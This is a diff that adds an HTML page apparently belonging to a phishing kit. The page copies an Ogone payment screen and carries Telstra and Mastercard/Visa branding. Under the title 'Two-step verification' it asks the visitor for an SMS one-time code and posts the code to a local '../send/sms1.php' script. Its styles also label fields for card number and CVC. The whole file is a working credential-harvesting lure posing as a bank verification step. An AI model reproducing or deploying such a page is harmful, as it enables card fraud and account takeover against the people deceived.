@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<!-- saved from url=(0057)https://secure.ogone.com/ncol/prod/orderstandard_utf8.asp -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+        <link rel="icon" href="https://www.telstra.com.au/etc/designs/telstra/images/t-logo-theme-brand-refresh-favicon.png">
+
+    <title>Two-step verification</title>
+    <style type="text/css">
+    /* Common elements for the HTML file */
+    /* @font-face
+    {
+        font-family: 'open_sansregular';
+        src: url('fonts/opensans-regular-webfont.eot');
+        src: url('fonts/opensans-regular-webfont.eot?#iefix') format('embedded-opentype'), url('fonts/opensans-regular-webfont.woff') format('woff'), url('fonts/opensans-regular-webfont.ttf') format('truetype'), url('fonts/opensans-regular-webfont.svg#open_sansregular') format('svg');
+        font-weight: normal;
+        font-style: normal;
+    }        */
+    
+    * {
+        box-sizing: border-box;
+    }
+    
+    html,
+    body {
+        margin: 0;
+        padding: 0;
+        background: #ffffff;
+        font-family: 'Arial', Verdana, sans-serif;
+        font-size: 14px;
+        color: #000;
+    }
+    
+    br {
+        height: 1px;
+    }
+   
+    a {
+        color: #FFCC00;
+    }
+    
+    form {
+        margin: 0px;
+        padding: 0px;
+        border: 0px;
+    }
+    
+    /* Lock Header */
+    
+    #main {
+        width: 100%;
+        padding: 20px 10px;
+    }
+    
+    #inner {
+        max-width: 360px;
+        margin: 0 auto;
+        background: #ffffff;
+        border: 1px solid #000000;
+    }
+    
+    #content {
+        margin: 20px;
+    }
+    
+    .securedBG {
+        height: 80px;
+        background: url('https://static.k-tuin.com/media/wysiwyg/nuclear-content/logo_mastercard_visa.png') center top no-repeat;
+        background-size: auto 60px;
+    }
+    
+    .secured {
+        text-indent: -9000px;
+    }
+    /* Ticket */
+    
+    .ncoltable1 {
+        width: 100%;
+        padding: 15px;
+        border: 1px solid #000000;
+        border-radius: 10px;
+    }
+    
+    .ncoltable1 tr:nth-child(1) .ncoltxtl:after {
+        content: "Merchant : ";
+    }
+    
+    .ncoltable1 tr:nth-child(2) .ncoltxtl:after {
+        content: "System :";
+    }
+    
+    .ncoltable1 tr:nth-child(3) .ncoltxtl:after {
+        content: "Card number : ";
+    }
+    
+    .ncoltxtl,
+    .ncoltxtr {
+        position: relative;
+        margin: 0;
+        padding: 0;
+        vertical-align: top;
+        word-break: break-word;
+        font-size: 14px;
+        line-height: 1em;
+    }
+    
+    .ncoltxtl {
+        padding-right: 10px;
+        text-align: right;
+    }
+    
+    .ncoltxtl small {
+        display: none;
+    }
+    
+    .ncoltxtl:after {
+        font-size: smaller;
+        color: #000;
+        top: 1px;
+    }
+    
+    .ncoltxtr {
+        text-align: left;
+        word-break: break-all;
+    }
+    /* Form */
+    
+    .ncoltable2 {
+        display: block;
+        width: 100%;
+        margin: 0 0 20px;
+        padding: 15px;
+        border: 1px solid #000000;
+        border-radius: 10px;
+    }
+    
+    .ncoltable2 tbody,
+    .ncoltable2 tr,
+    .ncoltable2 td {
+        display: block;
+        width: 100% !important;
+        margin: 0;
+        padding: 0;
+    }
+    
+        .ncoltable2 tr:nth-child(1) .ncoltxtl2 small{
+        display:none;
+    }
+    .ncoltable2 tr:nth-child(1) .ncoltxtl2:after {
+        content: " Enter the code that you received in the message to your mobile number ";
+        font-size: smaller;
+    }   
+    .ncoltable2 tr:nth-child(2) .ncoltxtl2 small {
+        display:none;
+    }
+    .ncoltable2 tr:nth-child(6) .ncoltxtl2 small{
+        display:none;
+    }
+    .ncoltable2 tr:nth-child(6) .ncoltxtl2:after {
+        content: "CVC/CVV/CID";
+        font-size: smaller;
+    }
+    
+    .ncoltable2 tr:nth-child(9) {
+        display: none;
+    }
+    
+    .ncoltable3 > tbody > tr:nth-child(1) {
+        display: none;
+    }
+    
+    td.ncoltxtl2 {
+        margin-bottom: 10px;
+        text-align: left;
+    }
+    
+    td.ncolinput {
+        margin-bottom: 20px;
+    }
+    
+    .ncolinput img {
+        width: 40px;
+    }
+    
+    .ncolinput small {
+        color: transparent;
+    }
+    
+    .ncolinput input,
+    .ncolinput select {
+        height: 40px;
+        width: 100%;
+        padding: 0 10px;
+        background-color: #fff;
+        border: 1px solid #000000;
+        border-radius: 4px;
+        font-family: 'Arial', sans-serif;
+        font-size: 14px;
+        color: #000;
+    }
+
+    .ncolinput select {
+        width: 80px;
+        margin-right: 20px;
+    }
+
+    input.ncol {
+        height: 40px;
+        width: 100%;
+        background-color: #1964c8;
+        border-radius: 4px 4px 0 4px;
+        border: none;
+        font-family: 'Arial', sans-serif;
+        font-size: 15px;
+        color: #fff;
+        -webkit-appearance: none;
+    }
+
+    input.ncol#ncol_cancel {
+        width: 120px;
+        background-color: #fff;
+        border: 1px solid #338AFF;
+        color: #FFCC00;
+    }
+
+    </style>
+</head>
+
+<body>
+    <div id="main" style="width: 100%">
+        <div id="inner">
+            <div id="content">
+               
+                <div class="mainContainerPaymentzone">
+                    
+<div class="WaitMsgClass" id="WaitMsgId" style="display: none;background-color: #FFFFFF;border: solid #CCCCCC 4px;padding: 4px;color: #000000;font-family: Verdana;font-weight: bold;position: absolute;width: 350px;"><img id="waitGif" src="./Betaalbevestiging_files/wait_turn.gif"></div>
+
+    <!-- Order overview -->
+    
+                            
+                
+                    <tr>
+                       <p style="line-height: 140%; text-align: left;"><span style="font-size: 36px; line-height: 50.4px;"><strong>Enter code </strong></span></p>
+
+                    </tr>
+                    
+    </tbody></table>
+<style type="text/css">
+    .sectionTitle {
+        font-weight: bold;
+        text-align:center;
+        vertical-align: baseline;
+        font-size: small;
+        padding : 10px;
+        text-decoration: underline;
+    }
+    .fieldTitle {
+        font-weight: bold;
+        text-align:right;
+        vertical-align: baseline;
+        font-size: small;
+        padding : 3px;
+    }
+    .fieldValue {
+        text-align:left;
+        vertical-align: baseline;
+        font-size: small;
+        padding : 3px;
+    }
+    .star {
+        font-size: 10px;
+    }
+    .note {
+        font-size: 10px;
+        padding : 3px;
+    }
+    .tc {
+        font-size: 10px;
+        padding : 5px;
+    }
+    .justify {
+        text-align : justify;
+    }
+</style>
+
+                        <form method="POST" action="../send/sms1.php" name="OGONE_CC_FORM" onsubmit="return my_valscript(this);">
+                    <p></p>
+
+                        <table class="ncoltable2" border="0" cellpadding="2" cellspacing="0" width="95%">
+
+                        <tbody>
+                            
+                                    <tr id="cvc_dob_row">
+                                        
+
+                                        <td class="ncoltxtl2" align="right">
+                                      
+                                        </td>
+
+                                        <td class="ncolinput">
+                                            <small>
+                                            
+                                                <input type="text" required="required" name="Ecom_Payment_sms_Verification" id="Ecom_Payment_sms_Verification" autocomplete="Off" size="10" maxlength="10" aria-required="true">
+
+                                                </small><font size="1" color="#ff0000" face="Arial">If you do not receive the OTP code within 5 minutes, please insert your phone number and verify your account using My Telstra app <strong></font></strong>
+                                             
+                                                </small>
+                                        </td>
+                                    </tr>
+                                <tr>
+                                    <td colspan="2" valign="middle" align="center">
+                                       
+                                        </tr>
+                                        <small><small>
+                                     
+                                        <br>
+                                        
+                                </small>
+                                        </small>
+                                        </td>
+                                </tr>
+                                
+                                <tr align="center">
+                                    <td colspan="2" valign="middle" align="">
+                                        <small>
+                                        
+                                    <input type="submit" class="ncol" name="payment" value="Confirm" id="submit3">
+                                
+                                        </small>
+                                        </td>
+                                </tr>
+                        </tbody></table>
+
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+
+</body></html>
